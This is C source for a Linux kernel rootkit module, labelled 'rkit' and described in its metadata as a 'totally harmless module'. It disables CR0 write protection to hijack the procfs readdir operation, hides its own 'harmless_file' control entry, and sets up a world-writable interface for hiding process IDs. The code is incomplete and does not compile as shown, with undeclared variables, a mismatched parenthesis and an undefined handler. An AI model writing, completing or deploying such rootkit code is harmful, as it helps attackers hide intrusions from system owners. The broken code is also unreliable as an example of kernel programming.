#include <linux/version.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/kernel.h>
#include <linux/string.h>
#include <linux/fs.h>
#include <linux/cred.h>
#include <linux/init.h>
#include <linux/list.h>

#define CONTROL_DIR "harmless_file"
#define HIDE_MODULE_FILE "hide_module"
#define HIDE_PID_FILE "hide_pid"
#define HIDE_FILE_FILE "hide_file"

#define CR0_PAGE_WP 0x10000

struct file_entry_list{
	char* name;
	struct list_head list;	

};

static file_entry_list*  find_file_entry(char *name, struct list_head* head){

	list_for_each_entry(structptr, head,list){
		if(!strcmp(name, structptr->name)){
			return structptr;
		}
	}
	return NULL;

}

LIST_HEAD(hidden_pid_list);

static inline void disable_wp(void){
	write_cr0(read_cr0() & (~ CR0_PAGE_WP));
}

static inline void enable_wp(void){
	write_cr0(read_cr0() | CR0_PAGE_WP);

}

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Michal Antonczak");
MODULE_VERSION("0.1");
MODULE_DESCRIPTION("totally harmless module");

static char* hide = "hide";
static char* show = "show";
static struct proc_dir_entry *proc_control;

static struct file_operations *procfs_fops;

#define INTERNAL_BUFFER_LEN 1024

static int (*procfs_readdir_proc)(struct file*, void*, filldir_t);

static filldir_t kernel_filldir;

static int proc_filldir_hider(void* buf, const char *name, int namelen, loff_t offset, u64 ino , unsigned d_type){
	
	if(!strncmp(name,CONTROL_DIR, strlen(CONTROL_DIR))){
		return 0;
	}
	return kernel_filldir(buf,name,namelen,offset,ino, d_type);
}

static int file_hider(struct file* fp, void* d, filldir_t filldir){
	kernel_filldir = filldir;
	return procfs_readdir_proc(fp, d, proc_filldir_hider);
}


static int control_read(char *buffer, char **buffer_location, off_t off, int count, int *eof , void *data){
	
		
	return len;
}

static int control_write(struct file* file, const char __user * buf, unsigned long count, void *data ){
	
	printk(KERN_INFO"random write strncmp -  %d %d ", strncmp(buf,"test", strlen("test")), count);
	return count;
}

static int pid_hide_write(struct file* file, const char __user * buf, unsigned long count, void *data ){


	char internal_buffer[INTERNAL_BUFFER_LEN];
	char pid[INTERNAL_BUFFER_LEN], dummy[INTERNAL_BUFFER_LEN];
	int items=0;
	struct file_entry_list* tmp=NULL;

	strncpy(internal_buffer, buf, min((count+1), INTERNAL_BUFFER_LEN));
	internal_buffer[min(count,INTERNAL_BUFFER_LEN)]=0;

	items = sscanf(internal_buffer, "%s %s", command, pid);

	if(items < 2){
		return count;
	}
	//since we have granted that the strings are null terminated by internat_buffer[stuff]=0 && sscanf
	//there's no need for strncmp i believe
	
	if(!strcmp(buf,hide)){

		if(find_file_entry(pid, hidden_pid_list) == NULL){
			tmp = kmalloc(sizeof(struct file_entry_list), GFP_KERNEL);	
			tmp->name = kmalloc(strlen(pid, GFP_KERNEL);
			strcpy(tmp->name, pid);

		}

	}

	if(!strcmp(buf,show)){
		tmp = find_file_entry(pid, hidden_pid_list);

		if(tmp!=NULL){
			list_del(tmp->list);
			kfree(tmp->name);
			kfree(tmp);
		}
	}

	return count;
}

static int pid_hide_read(char *buffer, char **buffer_location, off_t off, int count, int *eof , void *data){
	

	return len;
}



static struct proc_dir_entry* create_procfs_entry(const char* name, umode_t mode, struct proc_dir_entry* parent
		,int (*write_proc)(struct file*, const char __user *buf , unsigned long count, void *data)
		,int (*read_proc)(char *buffer, char **buffer_location, off_t off, int count, int *eof , void *data) ){

	static struct proc_dir_entry *tmp;
	//control dir setup
	tmp = create_proc_entry(name,mode ,parent);


	if( tmp == NULL){
		printk(KERN_INFO"cannot create entry %s", name);
		return NULL;	
	}

	tmp -> write_proc = write_proc;
	tmp -> read_proc = read_proc;	

	return tmp;

}

static int control_init(void){

	static struct proc_dir_entry *tmp;

	//control dir setup
	proc_control = create_procfs_entry(CONTROL_DIR, 0666, NULL, control_write,control_read);

	if( proc_control == NULL ){
		return 0;	
	}
	tmp = create_procfs_entry(HIDE_PID_FILE,0666,proc_control,pid_hide_write,pid_hide_hide);
	return 1; 
	

}
static void control_cleanup(void){

	remove_proc_entry(CONTROL_DIR,NULL);

}
static int proc_init(void){
	//setting up the control read write interface creating the file
	//and substituting the vfs functs for communication
	//its an easier and more flexible way than using ioctl

	struct proc_dir_entry *parent;


	parent = proc_control -> parent;
	procfs_fops = (struct file_operations *) parent->proc_fops;

	procfs_readdir_proc = procfs_fops -> readdir;
	
	printk(KERN_INFO"readdir");

	disable_wp();
	procfs_fops -> readdir = file_hider;
	enable_wp();
	
	printk(KERN_INFO"out of proc init");
	return 0; 
	
}

static void proc_cleanup(void){

	printk(KERN_INFO"%d", procfs_fops);

	if(procfs_fops !=NULL){
		disable_wp();
		procfs_fops -> readdir = procfs_readdir_proc ;
		enable_wp();printk(KERN_INFO"%p", procfs_fops);
	}

}

static int __init m_init(void){
	printk(KERN_INFO "rkit module loaded");
	control_init();
	proc_init();
	return 0; 

}

static void __exit m_exit(void){
	printk(KERN_INFO "unloading");
	proc_cleanup();
	control_cleanup();
	return;
}

module_init(m_init);
module_exit(m_exit);
